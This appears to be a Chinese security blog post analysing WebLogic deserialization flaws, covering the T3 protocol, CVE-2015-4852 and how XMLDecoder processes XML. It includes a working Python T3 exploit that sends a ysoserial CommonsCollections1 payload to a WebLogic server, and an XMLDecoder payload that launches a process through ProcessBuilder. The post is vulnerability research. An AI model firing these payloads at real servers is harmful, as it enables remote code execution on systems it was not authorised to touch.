<!DOCTYPE html><html lang="zh-Hans" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>浅析weblogic 反序列化漏洞 | ConsT27's Blog</title><meta name="keywords" content="java开发与安全"><meta name="author" content="ConsT27"><meta name="copyright" content="ConsT27"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议  T3协议weblogic t3协议就是weblogic的rmi所使用的协议。在传统java中，rmi使用的是jrmp协议。 JRMP协议的通信由如下部分构成 客户端对象服务端对象客户端代理对象（stub）服务端代理对象（skeleton）  而T3协议在JRMP协议上">
<meta property="og:type" content="article">
<meta property="og:title" content="浅析weblogic 反序列化漏洞">
<meta property="og:url" content="http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="ConsT27&#39;s Blog">
<meta property="og:description" content="先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议  T3协议weblogic t3协议就是weblogic的rmi所使用的协议。在传统java中，rmi使用的是jrmp协议。 JRMP协议的通信由如下部分构成 客户端对象服务端对象客户端代理对象（stub）服务端代理对象（skeleton）  而T3协议在JRMP协议上">
<meta property="og:locale">
<meta property="og:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bb.png">
<meta property="article:published_time" content="2021-11-05T13:45:25.111Z">
<meta property="article:modified_time" content="2021-11-05T13:46:54.483Z">
<meta property="article:author" content="ConsT27">
<meta property="article:tag" content="java开发与安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://const27blog.oss-cn-beijing.aliyuncs.com/img/bb.png"><link rel="shortcut icon" href="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210219183209.png"><link rel="canonical" href="http://const27.com/2021/11/05/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-11-05 21:46:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="ConsT27's Blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/2021/02/19/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://const27blog.oss-cn-beijing.aliyuncs.com/img/bb.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ConsT27's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/2021/02/19/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">浅析weblogic 反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-11-05T13:45:25.111Z" title="Created 2021-11-05 21:45:25">2021-11-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-11-05T13:46:54.483Z" title="Updated 2021-11-05 21:46:54">2021-11-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>先引用一下奇安信团队发出的weblogic历史漏洞图，可以发现以反序列化为主，反序列化问题主要来自XMLDecoder和T3协议</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/EkibxOB3fs4icZvMt447sQMic9fg5HZXT9GUxegpKfC0sDZFhNibfl1bbktWNsSZicNcJ3JLiaT5P9NtXm2hFhibwgmVQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<h2 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h2><p>weblogic t3协议就是weblogic的rmi所使用的协议。<br>在传统java中，rmi使用的是jrmp协议。</p>
<p>JRMP协议的通信由如下部分构成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端对象</span><br><span class="line">服务端对象</span><br><span class="line">客户端代理对象（stub）</span><br><span class="line">服务端代理对象（skeleton）</span><br></pre></td></tr></table></figure>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219152334.png" alt="QQ截图20210219152334"></p>
<p>而T3协议在JRMP协议上做出了改进，stub和skeleton都是动态生成的，将对象部署到RMI注册中心时weblogic会自动生成stub和skeleton。</p>
<p>Weblogic之所以开发T3协议，是因为他们需要可扩展，高效的协议来使用Java构建企业级的分布式对象系统</p>
<h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>我们想抓包分析T3协议有两个方法<br>1.写一个T3 rmi server和一个T3 rmi client，启动client去请求rmi server，从而实现抓包，这个方法的详细步骤在这篇文章中<a target="_blank" rel="noopener" href="https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8">https://hu3sky.github.io/2020/03/20/weblogic%20t3%20%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E4%B8%8E%E9%98%B2%E5%BE%A1/#%E5%AE%9E%E7%8E%B0%E6%AD%A3%E5%B8%B8t3%E7%B1%BB%E7%9A%84%E8%B0%83%E7%94%A8</a></p>
<p>2.使用python模拟client发包，从而实现T3协议抓包分析。这个实现起来比较容易，我们就通过该方法来一窥T3协议的奥妙。<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10365#toc-1%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%E5%9C%A8%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E4%B8%AD%EF%BC%8C%E8%BF%99%E9%87%8C%E4%B8%8D%E5%86%8D%E8%B5%98%E8%BF%B0%E3%80%82">https://xz.aliyun.com/t/10365#toc-1环境的搭建在这篇文章中，这里不再赘述。</a></p>
<p>在完成环境搭建后，我们使用如下exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from os import popen</span><br><span class="line">import struct # 负责大小端的转换</span><br><span class="line">import subprocess</span><br><span class="line">from sys import stdout</span><br><span class="line">import socket</span><br><span class="line">import re</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">def generatePayload(gadget,cmd):</span><br><span class="line">    YSO_PATH &#x3D; &quot;E:\\tools\\java\\ysoserial-master-d367e379d9-1.jar&quot;</span><br><span class="line">    popen &#x3D; subprocess.Popen([&#39;java&#39;,&#39;-jar&#39;,YSO_PATH,gadget,cmd],stdout&#x3D;subprocess.PIPE)</span><br><span class="line">    return popen.stdout.read()</span><br><span class="line"></span><br><span class="line">def T3Exploit(ip,port,payload):</span><br><span class="line">    sock &#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake &#x3D; &quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data &#x3D; sock.recv(1024)</span><br><span class="line">    compile &#x3D; re.compile(&quot;HELO:(.*).0.false&quot;)</span><br><span class="line">    match &#x3D; compile.findall(data.decode())</span><br><span class="line">    if match:</span><br><span class="line">        print(&quot;Weblogic: &quot;+&quot;&quot;.join(match))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Not Weblogic&quot;)</span><br><span class="line">        #return</span><br><span class="line">    header &#x3D; binascii.a2b_hex(b&quot;00000000&quot;)</span><br><span class="line">    t3header &#x3D; binascii.a2b_hex(b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;)</span><br><span class="line">    desflag &#x3D; binascii.a2b_hex(b&quot;fe010000&quot;)</span><br><span class="line">    payload &#x3D; header + t3header  +desflag+  payload</span><br><span class="line">    payload &#x3D; struct.pack(&quot;&gt;I&quot;,len(payload)) + payload[4:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    ip &#x3D; &quot;127.0.0.1&quot;</span><br><span class="line">    port &#x3D; 7001</span><br><span class="line">    gadget &#x3D; &quot;CommonsCollections1&quot;</span><br><span class="line">    cmd &#x3D; &quot;touch &#x2F;tmp&#x2F;hack&quot;</span><br><span class="line">    payload &#x3D; generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure>
<p>指定端口和IP后，可以通过以下指令来看是否攻击成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec  weblogic1036jdk7u21 ls tmp&#x2F;</span><br></pre></td></tr></table></figure>
<p>我们通过抓取相关流量包来一窥T3协议，wireshark设置tcp.port==7001，执行以上脚本，抓取T3流量</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185642616.png" alt="image-20211031185642616"></p>
<p>发送的第一个包为T3协议头，t3后面接的使weblogic客户端版本</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031185839574.png" alt="image-20211031185839574"></p>
<p>服务器会返回应答，并在HELO 后接weblogic服务端版本，利用这个特性可以刺探weblogic服务器版本</p>
<p><img src="C:\Users\14216\AppData\Roaming\Typora\typora-user-images\image-20211031190051255.png" alt="image-20211031190051255"></p>
<p>接下来客户端会发送一个相对比较大的数据包，其内容分析如下</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031204848507.png" alt="image-20211031204848507"></p>
<p>数据包仅为蓝色部分的内容，第一个框中是数据包的长度，第二个框是反序列化标志，两个框中间是T3协议头，剩下的便是序列化数据。</p>
<p>T3协议发送序列化数据时有时候并不只发送一段序列化数据，它可能会发送多个序列化数据，彼此之间以反序列化标志隔开，就像这样</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031210027329.png" alt="image-20211031210027329"></p>
<h3 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h3><p>漏洞版本</p>
<blockquote>
<p>10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0</p>
</blockquote>
<p>上面的exp就是哪来打这个洞的，上述CVE版本没有对T3反序列化安全问题做任何防范，利用T3协议反序列化CC链。jdk1.7，weblogic10.3.6.0 用cc链1，3，6都能打。</p>
<p>这个洞可以说是weblogic反序列化漏洞的源头了。</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><strong>weblogic.rjvm.InboundMsgAbbrev#readObject</strong></p>
<p>作为入口的readObject方法就在此处，在此中调用了InboundMsgAbbrev.ServerChannelInputStream的readObject方法，var1即是序列化后的数据，我们进行一个跟进</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031213830584.png" alt="image-20211031213830584"></p>
<p><strong>InboundMsgAbbrev.ServerChannelInputStream#readObject</strong></p>
<p>跟进后发现此类继承自ObjectInputStream且未重写readObject方法<br>也就是说序列化数据传入后直接以参数的形式传入了ObjectInputStream对象，并调用了其readObject方法。<br>于是便畅通无阻的触发了反序列化漏洞</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211031215946437.png" alt="image-20211031215946437"></p>
<h4 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h4><p>这里之所以要说一下resolveClass，是因为网上很多T3反序列化相关文章都提了这个东西，也是我之前不知道的一个东西，所以便记录一下。</p>
<p>resolveClass是ObjectInputStream.readObject()中必经的一个方法，也就是说在反序列化过程中，序列化的数据都会从resolveClass这个方法中经过一次。</p>
<p>这个方法的作用是类的序列化描述符加工成该类的Class对象，很多针对反序列化Gadget的拦截都是通过重写此方法完成的（如通过黑名单来禁止某类反序列化）</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162703325.png" alt="image-20211101162703325"></p>
<p>贴上一张廖师傅的博客的反序列化攻击时序图：<br>可以看到反序列化拦截位置除了resolveClass以外还有一个resolveProxyClass，它用于返回实现了代理类描述符中所有接口的代理类，这里不对该方法展开叙述，它也可以被用作反序列化攻击的拦截</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101134646925.png" alt="image-20211101134646925"></p>
<p>上文在分析CVE-2015-4852时，InboundMsgAbbrev.ServerChannelInputStream类重写了resolveClass，如果重写得当那么就可以起到缓解反序列化漏洞的作用，可惜这个类直接调用了父类的resolveClass</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211101162325788.png" alt="image-20211101162325788"></p>
<h2 id="XMLDecoder"><a href="#XMLDecoder" class="headerlink" title="XMLDecoder"></a>XMLDecoder</h2><p>XMLDecoder是一套用于对XML进行序列化或反序列化的一套API，它在JDK1.4就已经被开发了出来，它对XML的解析模式并不是更为人所知的DOM解析，而是SAX解析。<br>DOM解析在解析XML时会读取所有数据然后生成DOM树来解析，而SAX则是线性读取XML，所以SAX解析XML性能消耗相对较小。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102152704874.png" alt="image-20211102152704874"></p>
<h3 id="apache-xerces"><a href="#apache-xerces" class="headerlink" title="apache xerces"></a>apache xerces</h3><p>apache xerces是XMLDecoder解析XML时的一个重要组件。<br>apache xerces是一个用于解析XML中有哪些标签，语法是否合法的解析器，官方在JDK1.5便集成了此解析器并作为XML的默认解析器。</p>
<p>在XML序列化数据传达至XMLDecoder.readObject() 方法进行反序列化等操作后，便会传递给xerces进行解析，在xerces解析完毕后数据便会交给DocumentHandler完成后续的操作，如果是JDK1.6便会交给ObjectHandler进行处理。</p>
<h3 id="DocumentHandler"><a href="#DocumentHandler" class="headerlink" title="DocumentHandler"></a>DocumentHandler</h3><p>DocumentHandler（com.sun.beans.decoder.DocumentHandler）在XMLDecoder处理XML数据时起到事件处理器的作用，它在JDK1.7中被实现。<br>它会跟进传入的XML标签，属性等信息调用不同的Handler进行事件处理<br>我们针对XMLDecoder的反序列化攻击便是传入特定的XML序列化数据由DocumentHandler进行事件处理，进而实现RCE等攻击。</p>
<p>下图是jdk1.7 DocumentHandler中所定义的各种标签的处理办法。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154241440.png" alt="image-20211102154241440"></p>
<p>JDK1.6中也有个和DocumentHandler功能类似的ObjectHandler，但是它实现的标签远少于DocumentHandler，且远不如其规范化。下图是ObjectHandler的部分代码。</p>
<p>“值得注意的是CVE-2019-2725的补丁绕过其中有一个利用方式就是基于JDK1.6。”</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102154904139.png" alt="image-20211102154904139"></p>
<p>下面举例一下各标签的作用</p>
<p><strong>string</strong></p>
<p>&lt;string&gt;aaa&lt;/string&gt;</p>
<p>的意思就是表示一段值为aaa的字符串，这个标签一般与其他标签一起用来达到一些效果</p>
<p><strong>object</strong></p>
<p>object标签表示一个对象，其class属性指定类名，method属性指定某方法名（构造方法方法名为new）</p>
<p>如 new A(“test”); 的xml文档表现为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object class&#x3D;&quot;A&quot; method&#x3D;&quot;new&quot;&gt;</span><br><span class="line">	&lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure>
<p><strong>void</strong></p>
<p>void一般与其他标签搭配使用，它也有method，class等属性，于是它和object标签十分相像。</p>
<p>void一般用于函数调用并通过method属性指定方法名，以及其他辅助作用（如array标签中充当索引）</p>
<p>如A a = new A(); A.foo(“test”); 的xml文档表现为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;object class&#x3D;&quot;A&quot;&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;foo&quot;&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;object&gt;</span><br></pre></td></tr></table></figure>
<p><strong>array</strong></p>
<p>array标签用于表示数组，class属性指定类名，内部通过void标签的index属性设置索引</p>
<p>如 String[] a = new String[];s[1]=”test” 的xml表现形式为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot;&gt;</span><br><span class="line">    &lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">    &lt;string&gt;test&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br></pre></td></tr></table></figure>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>不同的XML标签对应着不同的handler，也就对应着不同的处理机制。<br>大多数handler都有addAttribute方法，这个方法主要用于提取标签中的属性并进行处理；<br>以及getValueObject方法，这个方法主要用于获取标签的值。</p>
<p>首先以java标签为例：var1对应着属性名，var2对应着属性值。java标签会根据class属性中的值进行类加载。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162202707.png" alt="image-20211102162202707"></p>
<p>再来看看New标签：和java标签的handler类似，它也会进行类加载操作，不过NewElementHandler是许多handler的父类（如ArrayElementHandler，ObjectElementHandler），这就意味着NewElementHandler的子类也可以进行类加载</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211102162638378.png" alt="image-20211102162638378"></p>
<p>在上文中提到object标签有进行类加载的能力，是因为其class属性是由父类NewElementHandler进行处理的。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141517211.png" alt="image-20211103141517211"></p>
<p>而void标签之所以和object标签如此相像的原因是，VoidElementHandler继承自ObjectElementHandler，且仅重写了一个isArgument方法，其它都和父类一样。</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103141611207.png" alt="image-20211103141611207"></p>
<p>再来看看array，它也是一个很重要的标签</p>
<h3 id="Demo调试"><a href="#Demo调试" class="headerlink" title="Demo调试"></a>Demo调试</h3><p>从上文大概知道XMLDecoder处理xml的流程为 :XMLDecoder.readObject() -&gt;xerces解析-&gt;DocumentHandler事件处理，那不如写个Demo调试一下看看具体过程如何</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.beans.XMLDecoder;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) throws FileNotFoundException &#123;</span><br><span class="line">         String s &#x3D; &quot;&lt;java version&#x3D;\&quot;1.7.0_80\&quot; class&#x3D;\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot; &lt;object class&#x3D;\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;array class&#x3D;\&quot;java.lang.String\&quot; length&#x3D;\&quot;1\&quot;&gt;\n&quot; +</span><br><span class="line">                 &quot;    &lt;void index&#x3D;\&quot;0\&quot;&gt;&lt;string&gt;calc&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;&#x2F;array&gt;\n&quot; +</span><br><span class="line">                 &quot;  &lt;void method&#x3D;\&quot;start\&quot;&gt;&lt;&#x2F;void&gt;\n&quot; +</span><br><span class="line">                 &quot; &lt;&#x2F;object&gt;\n&quot; +</span><br><span class="line">                 &quot;&lt;&#x2F;java&gt;&quot;;</span><br><span class="line">        StringBufferInputStream stringBufferInputStream &#x3D; new StringBufferInputStream(s);</span><br><span class="line">        XMLDecoder xmlDecoder &#x3D; new XMLDecoder(stringBufferInputStream);</span><br><span class="line">        Object o &#x3D; xmlDecoder.readObject();</span><br><span class="line">        System.out.println(o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接开始动调，在demo中xmlDecoder.readObject() 处下断点。跟进。</p>
<h4 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h4><p>跟进readObject,可以发现调用了parsingComplete(),继续跟进</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103150406152.png" alt="image-20211103150406152"></p>
<p>java.beans.XMLDecoder#parsingComplete, 因为我们跟踪的是对XML的解析过程，所以这个parse方法就很可疑，而且又因为是可跟进的，所以我们对其进行一个跟进</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103190636095.png" alt="image-20211103190636095"></p>
<p>com.sun.beans.decoder.DocumentHandler#parse,又发现一个parse，跟进</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191553843.png" alt="image-20211103191553843"></p>
<p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse,又找到一个parse，跟进</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191733578.png" alt="image-20211103191733578"></p>
<p>com.sun.org.apache.xerces.internal.jaxp. SAXParserImpl#parse，发现跟进来的这个parse是重载方法，在其中又发现了parse，再跟</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103191905287.png" alt="image-20211103191905287"></p>
<p>com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser#parse,发现parse，又跟</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192132155.png" alt="image-20211103192132155"></p>
<p>com.sun.org.apache.xerces.internal.parsers.XMLParser#parse</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192259557.png" alt="image-20211103192259557"></p>
<p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103192350388.png" alt="image-20211103192350388"></p>
<p>com.sun.org.apache.xerces.internal.parsers. XML11Configuration#parse,上一个parse的重载，其中调用了一个叫scanDocument的方法</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211103195452940.png" alt="image-20211103195452940"></p>
<p>跟进scanDocument，到这里就已经进入了xerces解析了。这里有个do..while循环，作用是提取XML标签</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104135729090.png" alt="image-20211104135729090"></p>
<p>调用链:</p>
<p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20211104140128888.png" alt="image-20211104140128888"></p>
<h4 id="ScanDocument"><a href="#ScanDocument" class="headerlink" title="ScanDocument"></a>ScanDocument</h4><p>我们来看一下scanDocument这个方法。    这里循环执行了next()方法，在前十几个循环里，这个方法对XML进行了解析和事件处理。大致的处理流程是对每一个解析到的标签先实例化对应的handler，然后循环调用addAttribute方法获取其所有属性并进行一定的事件处理，当解析到某个标签的结束标签时(如&lt;/java&gt;) 便会调用getValueObject 获取标签中的值的信息。这里借用一个图</p>
<p><img src="https://image.3001.net/images/20200820/1597902334.png!small" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  public boolean scanDocument(boolean complete) throws IOException, XNIException &#123;</span><br><span class="line">      this.fEntityManager.setEntityHandler(this);</span><br><span class="line">      int event &#x3D; this.next();</span><br><span class="line">      </span><br><span class="line">do &#123;</span><br><span class="line">          switch(event) &#123;</span><br><span class="line">          case 1:</span><br><span class="line">          case 2:</span><br><span class="line">          case 6:</span><br><span class="line">	..................</span><br><span class="line">	 case 12:</span><br><span class="line">              this.fDocumentHandler.startCDATA((Augmentations)null);</span><br><span class="line">              this.fDocumentHandler.characters(this.getCharacterData(), (Augmentations)null);</span><br><span class="line">              this.fDocumentHandler.endCDATA((Augmentations)null);</span><br><span class="line"></span><br><span class="line">          event &#x3D; this.next();</span><br></pre></td></tr></table></figure>
<p>下面的调试我对XML中所涉及的所有handler的所有方法均下了断点以方便调试。</p>
